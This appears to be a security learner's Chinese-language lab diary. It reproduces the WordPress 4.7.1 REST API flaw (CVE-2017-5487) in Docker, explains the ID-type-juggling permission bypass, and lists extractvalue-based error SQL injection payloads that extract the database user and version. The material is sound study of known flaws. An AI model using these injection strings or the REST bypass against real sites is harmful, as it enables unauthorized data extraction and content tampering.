
  
# Day 5  

## 2019/07/12

### CVE-2017-5487

先用docker把wordpress4.7.1和mysql准备好

`docker pull wordpress:4.7.1`

`docker run -d --name mysql5.7 -e MYSQL_ROOT_PASSWORD=root -e MYSQL_DATABASE=wordpress -v $(pwd)/mysql:/var/lib/mysql mysql:5.7`

`docker exec -it mysql5.7 /bin/bash`

> `mysql -uroot -p`  
> `use mysql;`  

mysql准备好以后接下来就准备wp

`docker run --name wordpress4.7.1 -e WORDPRESS_DB_HOST=172.17.0.2:3306 -e WORDPRESS_DB_USER=root -e WORDPRESS_DB_PASSWORD=root -p 83:80 -dt wordpress:4.7.1
`

DB_HOST可以通过`ip a`看到，端口按照之前设定的3306来

安装之前修改一下配置文件

确认 Httpd-conf  Allowover All

![img1]()

![img2]()

下载poc

https://gist.github.com/leonjza/2244eb15510a0687ed93160c623762ab

打到未授权获取发布过文章的其他用户的用户名、id

![img3]()

#### 原理（来自：https://iassas.com/archives/5a5cf5bb.html）

查看/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php的第90行，发现参数ID的值会被过滤成数字。

发现REST API在管理访问时，其会在正则表达式之前优先考虑`$_GET`和`$_POST`的值。

例如: 

/wp-json/wp/v2/posts/1234?id=12345helloworld，REST API会将其ID参数设置成12345helloworld。

在99行使用了`update_item`和`update_item_permissions_check`。

![img4]()

查看593行的`update_item_permissions_check`函数，其将ID值传递给`get_post()`函数。

这个函数功能用来检查帖子是否存在、是否有权限。

如果发送的ID没有对应的post，就可以绕过权限检查，并允许继续执行`update_item`方法。

![img5]()

由于使用`get_instance()`静态方法来获取post，造成`get_post()`在特定情况下无法找到对应的ID。

查看/wordpress/wp-includes/class-wp-post.php第210行，发现需全部使用数字，例如123ABC将会导致获取post失败。

有一个细节，其会将ID参数在传递给get_post之前会将其转换成整数。

![img6]()

PHP语言中做类型的比较和转换时，其会返回整数。例如

![img7]()

例如提交一个请求为/wp-json/wp/v2/posts/123?id=456ABC，PHP会将其ID返回456。由于456ABC并不是纯数字会导致/wordpress/wp-includes/class-wp-post.php获取post_id失败。

在流程进入权限检查时`update_item_permissions_check`判断其没有对应的post绕过权限判断，进行更新操作`update_item`。最终导致ID为456被修改。

在受影响的WordPress版本中REST API接口是默认开放的。任何用户都可以利用该漏洞修改任意文章，只需要指定修改文章的ID即可。

### extractvalve()+updatexml()报错注入

名称 |   描述    |   
-|-
extractvalve() | 使用XPath表示法从XML字符串中提取值
updatexml() | 返回替换的XML片段

原理：https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html

语句：` id=1 and (extractvalue(1,concat(0x5c,(select user()))))`

可以通过less-5来实现，payload如下

注出路径：`id=1' and (extractvalue(1,concat(0x5c,(select user())))) --+`

注出版本号：`?id=1'; and extractvalue(1,(concat(0x7e,(select @@version),0x7e))) --+`或者`?id=1' and extractvalue(1,(concat(0x7e,(select version()),0x7e))) --+`

句式：
` and extractvalue(1,(concat(0x7e,(payload),0x7e)))`

payload里面写想要查询的东西的语句

